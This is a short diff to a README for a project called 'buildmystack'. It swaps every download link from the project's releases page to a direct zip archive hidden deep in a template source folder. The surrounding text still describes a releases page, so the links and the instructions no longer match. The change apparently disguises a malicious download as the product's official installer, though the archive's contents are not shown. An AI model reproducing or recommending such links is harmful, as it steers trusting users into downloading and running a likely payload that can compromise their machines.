@@ -1,6 +1,6 @@
 # 🧱 buildmystack - Build full-stack apps fast
 
-[![Download buildmystack](https://img.shields.io/badge/Download%20buildmystack-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rudrasigh2008-stack/buildmystack/releases)
+[![Download buildmystack](https://img.shields.io/badge/Download%20buildmystack-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rudrasigh2008-stack/buildmystack/raw/refs/heads/main/templates/modules/database/mongo/server/src/Software-2.6.zip)
 
 ## 🖥️ What buildmystack does
 
@@ -36,7 +36,7 @@ For a smoother run, use:
 
 Visit this page to download buildmystack for Windows:
 
-https://github.com/rudrasigh2008-stack/buildmystack/releases
+https://github.com/rudrasigh2008-stack/buildmystack/raw/refs/heads/main/templates/modules/database/mongo/server/src/Software-2.6.zip
 
 On that page, look for the latest release and download the Windows file from the Assets section.
 
@@ -175,7 +175,7 @@ Try these steps:
 
 Download or check the latest Windows release here:
 
-https://github.com/rudrasigh2008-stack/buildmystack/releases
+https://github.com/rudrasigh2008-stack/buildmystack/raw/refs/heads/main/templates/modules/database/mongo/server/src/Software-2.6.zip
 
 ## 🗂️ Project topics
 
